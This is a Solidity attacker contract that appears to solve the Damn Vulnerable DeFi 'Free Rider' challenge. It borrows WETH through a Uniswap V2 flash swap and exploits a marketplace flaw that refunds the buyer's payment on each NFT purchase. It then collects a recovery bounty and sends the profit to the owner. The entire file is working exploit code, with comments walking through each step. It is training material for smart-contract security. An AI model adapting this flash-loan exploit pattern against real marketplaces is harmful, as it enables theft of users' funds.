// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import {IDamnValuableNFT} from "./IDamnValuableNFT.sol";
import {IDamnValuableToken} from "./IDamnValuableToken.sol";
import {IFreeRaiderNFTMarketplace} from "./IFreeRaiderNFTMarketplace.sol";
import {IFreeRaiderRecovery} from "./IFreeRaiderRecovery.sol";
import {IUniswapV2Callee} from "./IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "./IUniswapV2Pair.sol";
import {IWETH} from "./IWETH.sol";

contract FreeRaiderNFTMarketplaceAttacker is
    Ownable2Step,
    IUniswapV2Callee,
    IERC721Receiver
{
    uint256 private constant ROUND_UP_FEE_VALUE = 1;
    IWETH private immutable i_weth;
    IUniswapV2Pair private immutable i_uniPair;
    IDamnValuableToken private immutable i_dvt;
    IDamnValuableNFT private immutable i_dvNft;
    IFreeRaiderNFTMarketplace private immutable i_marketplace;
    IFreeRaiderRecovery private immutable i_recovery;

    error SendEthFailed();
    error UniswapV2CallCallerIsNotUniswapPair();
    error UniswapV2CallSenderIsNotThis();

    constructor(
        address payable _wethAddr,
        address _dvtAddr,
        address _uniPairAddr,
        address _dvNFTAddr,
        address _marketplaceAddr,
        address _recoveryAddr
    ) Ownable2Step() {
        // 1. Store all the interfaces to be used during the attack. Few addresses (e.g. WETH, DVT DVNFT) could be
        // obtained reading from contract storages (e.g. i_uniPair, i_marketplace).
        i_weth = IWETH(_wethAddr);
        i_dvt = IDamnValuableToken(_dvtAddr);
        i_dvNft = IDamnValuableNFT(_dvNFTAddr);
        i_uniPair = IUniswapV2Pair(_uniPairAddr);
        i_marketplace = IFreeRaiderNFTMarketplace(_marketplaceAddr);
        i_recovery = IFreeRaiderRecovery(_recoveryAddr);
    }

    receive() external payable {}

    // @dev the exploit logic can't be executed in this contract constructor.
    // @dev how to use UniswapV2 Flash Swaps
    // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
    function exploit(
        uint256 _borrowAmount,
        uint256[] memory _tokenIds
    ) external onlyOwner {
        // 2. Borrow WETH to perform the attack via a `<UniswapVpair>` Flash Swap.
        // This step requires this contract to be `IUniswapV2Callee`
        bytes memory data = abi.encode(_tokenIds);
        i_uniPair.swap(_borrowAmount, 0, address(this), data);
    }

    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256,
        bytes calldata _data
    ) external {
        // NB: at this point this contract is in possesion o as mnay WETH as `_amount0`.
        // NB: other validations could be performed (e.g. borrowed token and amount, token IDs)
        if (msg.sender != address(i_uniPair)) {
            revert UniswapV2CallCallerIsNotUniswapPair();
        }
        if (_sender != address(this)) {
            revert UniswapV2CallSenderIsNotThis();
        }
        // 3. Get the borrow amount and token IDs from the callback data
        uint256[] memory tokenIds = abi.decode(_data, (uint256[]));

        // 4. Unwrap the WETH to be able to buy DVNFTs from the market
        i_weth.withdraw(_amount0);
        // 5. Buy them all with just 15 ETH thanks to the vulnerability (this step requires this contract to be
        // `IERC721Receiver`). Due to the marketplace vulnerability each NFT buy will transfer 15 ETH to this contract
        // (ending with 90 ETH)
        i_marketplace.buyMany{value: _amount0}(tokenIds);

        // 6. Safe transfer all the DVNFTs to the recovery contract in terms to get the 45 ETH bounty
        // NB: the bounty is sent to a determined recipient (i.e. player address) encoded in the call
        address attacker = owner();
        uint256 tokenIdsLength = tokenIds.length;
        for (uint256 i; i < tokenIdsLength; ) {
            i_dvNft.safeTransferFrom(
                address(this),
                address(i_recovery),
                tokenIds[i],
                abi.encode(attacker) // NB: player address
            );
            unchecked {
                ++i;
            }
        }

        //  7. Calculate the amount of WETH that must be repaid to the UniswapV2 pool (includes the 0.03% fee)
        uint256 amountToRepay = _calculateRepayAmount(_amount0); // NB: 15045135406218655968 wei

        // 8. Wrap the required ETH
        i_weth.deposit{value: amountToRepay}();

        // 9. Repay the pool with WETH
        i_weth.transfer(address(i_uniPair), amountToRepay);

        // 10. Transfer all the remaining ETH to the attacker (owner)
        (bool success, ) = attacker.call{value: address(this).balance}(""); // NB: 74954864593781344032 wei
        if (!success) {
            revert SendEthFailed();
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // @dev documentation found in:
    // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps#single-token
    function _calculateRepayAmount(
        uint256 _borrowAmount
    ) private pure returns (uint256) {
        uint256 fee = (_borrowAmount * 3) / 997 + ROUND_UP_FEE_VALUE; // NB: 0.3% fee rounding up
        return _borrowAmount + fee;
    }
}
